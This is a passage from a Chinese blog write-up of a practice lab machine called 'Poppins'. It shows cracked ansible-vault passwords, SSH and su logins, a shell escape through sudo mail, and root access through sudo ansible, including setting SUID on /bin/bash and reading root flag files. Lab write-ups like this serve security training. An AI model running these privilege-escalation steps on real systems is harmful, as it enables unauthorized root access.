+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+javiel           (1.vault)     
+1g 0:00:01:44 DONE (2025-09-02 21:50) 0.009576g&#x2F;s 851.3p&#x2F;s 851.3c&#x2F;s 851.3C&#x2F;s jojo95..janele
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# ansible-vault view 1.vault      
+Vault password: 
+cumibug<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="提权至javiel"><a href="#提权至javiel" class="headerlink" title="提权至javiel"></a>提权至javiel</h2><p>javiel是jane用户的密码,</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# ssh jane@192.168.209.213
+jane@192.168.209.213&#39;s password: 
+Permission denied, please try again.
+jane@192.168.209.213&#39;s password: 
+Linux Poppins 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU&#x2F;Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
+
+Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Sep  2 21:08:37 2025 from 192.168.209.76
+jane@Poppins:~$ id
+uid&#x3D;1001(jane) gid&#x3D;1001(jane) groups&#x3D;1001(jane)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>cumibug是另一个用户的密码，因为无法ssh登陆因此只能在jane用户下su切换</p>
+<h2 id="提权至michael"><a href="#提权至michael" class="headerlink" title="提权至michael"></a>提权至michael</h2><pre class="line-numbers language-none"><code class="language-none">jane@Poppins:~$ su michael
+Password: 
+michael@Poppins:~$ id
+uid&#x3D;1002(michael) gid&#x3D;1002(michael) groups&#x3D;1002(michael)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看一下sudo权限</p>
+<pre class="line-numbers language-none"><code class="language-none">michael@Poppins:~$ sudo -l
+[sudo] password for michael: 
+Matching Defaults entries for michael on Poppins:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User michael may run the following commands on Poppins:
+    (winifred) PASSWD: &#x2F;usr&#x2F;bin&#x2F;mail *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在gtfobins内的shell逃逸命令无法使用，先尝试给winired用户写一个空邮件试试，然后在mail程序交互界面执行命令</p>
+<h2 id="提权至winifred"><a href="#提权至winifred" class="headerlink" title="提权至winifred"></a>提权至winifred</h2><pre class="line-numbers language-none"><code class="language-none">michael@Poppins:~$ sudo -u winifred &#x2F;usr&#x2F;bin&#x2F;mail -s &quot;test&quot; winifred&lt;&#x2F;dev&#x2F;null
+Null message body; hope that&#39;s ok
+michael@Poppins:~$ sudo -u winifred &#x2F;usr&#x2F;bin&#x2F;mail
+Mail version 8.1.2 01&#x2F;15&#x2F;2001.  Type ? for help.
+&quot;&#x2F;var&#x2F;mail&#x2F;winifred&quot;: 1 message 1 new
+&gt;N  1 winifred@poppins   Tue Sep 02 21:55   18&#x2F;558   test
+Message 1:
+From winifred@poppins Tue Sep 02 21:55:25 2025
+Envelope-to: winifred@poppins
+Delivery-date: Tue, 02 Sep 2025 21:55:25 -0400
+To: winifred@poppins
+Subject: test
+MIME-Version: 1.0
+Content-Type: text&#x2F;plain; charset&#x3D;&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+From: winifred@poppins
+Date: Tue, 02 Sep 2025 21:55:25 -0400
+
+&amp; !&#x2F;bin&#x2F;bash
+winifred@Poppins:~$ id
+uid&#x3D;1003(winifred) gid&#x3D;1003(winifred) groups&#x3D;1003(winifred)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h2><pre class="line-numbers language-none"><code class="language-none">winifred@Poppins:&#x2F;home&#x2F;bert$ sudo -l
+Matching Defaults entries for winifred on Poppins:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User winifred may run the following commands on Poppins:
+    (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;ansible *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>直接给ai，他会给出命令</p>
+<pre class="line-numbers language-none"><code class="language-none">winifred@Poppins:&#x2F;home&#x2F;bert$ sudo &#x2F;usr&#x2F;bin&#x2F;ansible localhost -m shell -a &#39;id&#39;
+[WARNING]: No inventory was parsed, only implicit localhost is available
+localhost | CHANGED | rc&#x3D;0 &gt;&gt;
+uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>权限是root，那么可以直接读flag，也可以给&#x2F;bin&#x2F;bash一个suid权限</p>
+<pre class="line-numbers language-none"><code class="language-none">winifred@Poppins:&#x2F;home&#x2F;bert$ sudo &#x2F;usr&#x2F;bin&#x2F;ansible localhost -m shell -a &#39;cat &#x2F;root&#x2F;root.txt&#39;
+[WARNING]: No inventory was parsed, only implicit localhost is available
+localhost | CHANGED | rc&#x3D;0 &gt;&gt;
+flag&#123;root-bdabe071bed8018ba8e15d795d281843&#125;
+
+
+winifred@Poppins:&#x2F;home&#x2F;bert$ ls -al &#x2F;bin&#x2F;bash
+-rwxr-xr-x 1 root root 1168776 Apr 18  2019 &#x2F;bin&#x2F;bash
+winifred@Poppins:&#x2F;home&#x2F;bert$ sudo &#x2F;usr&#x2F;bin&#x2F;ansible localhost -m shell -a &#39;&#x2F;bin&#x2F;bash -i -c &quot;exec bash&quot;&#39;
+[WARNING]: No inventory was parsed, only implicit localhost is available
+localhost | CHANGED | rc&#x3D;0 &gt;&gt;
+
+winifred@Poppins:&#x2F;home&#x2F;bert$ sudo &#x2F;usr&#x2F;bin&#x2F;ansible localhost -m shell -a &#39;sudo chmod u+s &#x2F;bin&#x2F;bash&#39;
+[WARNING]: No inventory was parsed, only implicit localhost is available
+[WARNING]: Consider using &#39;become&#39;, &#39;become_method&#39;, and &#39;become_user&#39; rather than running sudo
+localhost | CHANGED | rc&#x3D;0 &gt;&gt;
+
+winifred@Poppins:&#x2F;home&#x2F;bert$ ls -al &#x2F;bin&#x2F;bash
+-rwsr-xr-x 1 root root 1168776 Apr 18  2019 &#x2F;bin&#x2F;bash
+winifred@Poppins:&#x2F;home&#x2F;bert$ bash -p
+bash-5.0# id
+uid&#x3D;1003(winifred) gid&#x3D;1003(winifred) euid&#x3D;0(root) groups&#x3D;1003(winifred)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-none"><code class="language-none">bash-5.0# cat root.txt &#x2F;var&#x2F;mail&#x2F;user.txt 
+flag&#123;root-bdabe071bed8018ba8e15d795d281843&#125;
+flag&#123;user-b1d2367529a9edd2a6f9c95168bce12ei&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drume2.github.io">Morii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drume2.github.io/posts/e94215f1.html">https://drume2.github.io/posts/e94215f1.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drume2.github.io" target="_blank">Moriiの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a></div><div class="post_share"><div class="social-share" data-image="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/877cf9fc.html"><img class="next-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HMV-Art</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/f20c21c3.html" title="群友靶机-5ud0"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-15</div><div class="title">群友靶机-5ud0</div></div></a></div><div><a href="/posts/6233c82f.html" title="群友靶机-Mayuri"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-09</div><div class="title">群友靶机-Mayuri</div></div></a></div><div><a href="/posts/894d00c3.html" title="群友靶机-Per1"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-10</div><div class="title">群友靶机-Per1</div></div></a></div><div><a href="/posts/6768e8fd.html" title="群友靶机-Monitor"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-11</div><div class="title">群友靶机-Monitor</div></div></a></div><div><a href="/posts/e2bfefbb.html" title="群友靶机-Basic"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-08</div><div class="title">群友靶机-Basic</div></div></a></div><div><a href="/posts/e8b3ee3e.html" title="群友靶机-Space"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-23</div><div class="title">群友靶机-Space</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Twikoo</span><span class="switch-btn"></span><span class="second-comment">Valine</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Morii</div><div class="author-info__description">博客因兴趣诞生,在不断完善中</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drume1/drume1.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1159927667&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">兴趣爱好才是最大的动力，何不与我共同来攀知识高峰，品翘楚美人！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Poppins"><span class="toc-number">1.</span> <span class="toc-text">群友靶机-Poppins</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">web探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4ssh%E7%99%BB%E9%99%86%E7%94%A8%E6%88%B7"><span class="toc-number">1.3.</span> <span class="toc-text">爆破ssh登陆用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3javiel"><span class="toc-number">1.4.</span> <span class="toc-text">提权至javiel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3michael"><span class="toc-number">1.5.</span> <span class="toc-text">提权至michael</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3winifred"><span class="toc-number">1.6.</span> <span class="toc-text">提权至winifred</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3root"><span class="toc-number">1.7.</span> <span class="toc-text">提权至root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">1.8.</span> <span class="toc-text">flag</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/e94215f1.html" title="群友靶机-Poppins"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-Poppins"/></a><div class="content"><a class="title" href="/posts/e94215f1.html" title="群友靶机-Poppins">群友靶机-Poppins</a><time datetime="2025-09-03T01:59:35.000Z" title="发表于 2025-09-03 09:59:35">2025-09-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/877cf9fc.html" title="HMV-Art"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Art"/></a><div class="content"><a class="title" href="/posts/877cf9fc.html" title="HMV-Art">HMV-Art</a><time datetime="2025-09-01T09:07:52.000Z" title="发表于 2025-09-01 17:07:52">2025-09-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/fd86349b.html" title="HMV-Dejavu"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Dejavu"/></a><div class="content"><a class="title" href="/posts/fd86349b.html" title="HMV-Dejavu">HMV-Dejavu</a><time datetime="2025-08-25T11:42:23.000Z" title="发表于 2025-08-25 19:42:23">2025-08-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/7cf3d774.html" title="HMV-translator"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-translator"/></a><div class="content"><a class="title" href="/posts/7cf3d774.html" title="HMV-translator">HMV-translator</a><time datetime="2025-08-24T12:37:11.000Z" title="发表于 2025-08-24 20:37:11">2025-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2024a330.html" title="THL-Uploader"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="THL-Uploader"/></a><div class="content"><a class="title" href="/posts/2024a330.html" title="THL-Uploader">THL-Uploader</a><time datetime="2025-08-24T02:32:33.000Z" title="发表于 2025-08-24 10:32:33">2025-08-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;undefined - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Morii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><<head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo@1/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'BF23duYcvhYPZIqUHv6NigOn-MdYXbMMI',
+      appKey: 'Bb6SG97mQjBt3SKeopWEnnQU',
+      avatar: 'monsterid',
+      serverURLs: 'https://bf23duyc.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Twikoo' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer data-pjax type="text/javascript" src="https://npm.elemecdn.com/xianqi-hexo/js/animate.js"></script><div class="aplayer no-destroy" data-id="3485712867" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="//code.tidio.co/null.js" async="async"></script><script>function onTidioChatApiReady() {
+  window.tidioChatApi.hide();
+  window.tidioChatApi.on("close", function() {
+    window.tidioChatApi.hide();
+  });
+}
+if (window.tidioChatApi) {
+  window.tidioChatApi.on("ready", onTidioChatApiReady);
+} else {
+  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
+}
+
+var chatBtnFn = () => {
+  document.getElementById("chat_btn").addEventListener("click", function(){
+    window.tidioChatApi.show();
+    window.tidioChatApi.open();
+  });
+}
+chatBtnFn()
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#posts-chart","#tags-chart","#categories-chart",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":160,"height":260},"mobile":{"show":false},"marked":{"prependRoot":true,"postAsset":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
